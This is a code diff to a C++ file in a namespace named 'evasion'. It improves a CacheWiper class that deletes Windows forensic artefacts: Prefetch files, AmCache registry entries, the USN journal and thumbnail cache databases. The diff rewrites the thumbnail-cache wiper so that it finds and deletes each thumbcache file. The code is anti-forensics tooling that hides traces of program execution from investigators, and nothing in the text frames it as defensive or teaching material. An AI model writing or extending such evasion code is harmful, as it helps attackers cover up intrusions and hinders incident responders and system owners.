@@ -1,10 +1,13 @@
-#include "cache_wiper.hpp"
+﻿#include "cache_wiper.hpp"
 #include <windows.h>
 #include <vector>
 #include <string>
 #include <thread>
 #include <chrono>
 #include <filesystem>
+#include <winioctl.h>
+#include <algorithm>
+#include <cwctype>
 
 namespace l4g::evasion {
 
@@ -43,7 +46,7 @@ bool CacheWiper::delete_prefetch_files(const wchar_t* pattern) {
     return ok;
 }
 
-bool CacheWiper::delete_amcache_entries(const wchar_t* exe_name) {
+bool CacheWiper::delete_amcache_entries(const wchar_t* /*exe_name*/) {
     // AmCache is in registry: HKLM\SYSTEM\CurrentControlSet\Control\AmCache
     // Requires parsing hive - simplified: just delete recent entries
     HKEY hKey = nullptr;
@@ -129,9 +132,27 @@ bool CacheWiper::wipe_usn_journal() {
 }
 
 bool CacheWiper::wipe_thumbnail_cache() {
-    std::wstring thumb_dir = std::wstring(std::getenv("LOCALAPPDATA")) + L"\\Microsoft\\Windows\\Explorer\\thumbcache_*.db";
-    // Use SHFileOperation or manual delete
-    return delete_prefetch_files(thumb_dir.c_str());
+    // Thumbcache lives outside Prefetch; delete it directly instead of
+    // reusing delete_prefetch_files(), which is hard-wired to C:\Windows\Prefetch.
+    char* local_appdata = std::getenv("LOCALAPPDATA");
+    if (!local_appdata) return false;
+    int need = MultiByteToWideChar(CP_ACP, 0, local_appdata, -1, nullptr, 0);
+    std::wstring base(need > 0 ? (size_t)need - 1 : 0, L'\0');
+    if (need > 1) MultiByteToWideChar(CP_ACP, 0, local_appdata, -1, base.data(), need);
+    std::wstring dir = base + L"\\Microsoft\\Windows\\Explorer\\";
+    std::wstring search = dir + L"thumbcache_*.db";
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileW(search.c_str(), &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return false;
+    bool ok = true;
+    do {
+        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            std::wstring path = dir + fd.cFileName;
+            if (!DeleteFileW(path.c_str())) ok = false;
+        }
+    } while (FindNextFileW(hFind, &fd));
+    FindClose(hFind);
+    return ok;
 }
 
 bool CacheWiper::wipe_all_caches() {
